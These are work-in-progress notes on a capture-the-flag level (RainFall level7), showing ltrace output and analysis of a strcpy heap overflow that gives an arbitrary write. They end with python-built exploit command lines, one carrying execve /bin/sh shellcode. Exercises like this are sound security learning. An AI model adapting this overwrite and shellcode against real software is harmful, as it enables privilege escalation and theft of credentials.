Segfault with less than 2 args.
interesting  ltrace output:
```
level7@RainFall:~$ ltrace ./level7 a b       
__libc_start_main(0x8048521, 3, 0xbffffd04, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                             = 0x0804a008
malloc(8)                                                                             = 0x0804a018
malloc(8)                                                                             = 0x0804a028
malloc(8)                                                                             = 0x0804a038
strcpy(0x0804a018, "a")                                                               = 0x0804a018
strcpy(0x0804a038, "b")                                                               = 0x0804a038
fopen("/home/user/level8/.pass", "r")                                                 = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

fgets fail, might be because it tries to write to a bad buffer (at 0x8049960).
We should try to have it write to 0x0804a008 instead
or more likely change the call to fgets to a call to m()...

wip: The address passed as first param is where argv[2] will be strcopied. So I can write what i want where i want...
```
 ltrace ./level7 $(python -c 'print "A"*20+"\x60\x99\x04\x08"') a


ltrace ./level7 $(python -c 'print "A"*20+"\x1c\xfc\xff\xbf"') $(python -c 'print "\x18\xa0\x04\x08"')

./level7 $(python -c 'print "\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"AAA"+"\x1c\xfc\xff\xbf"') $(python -c 'print "\x18\xa0\x04\x08"')
```
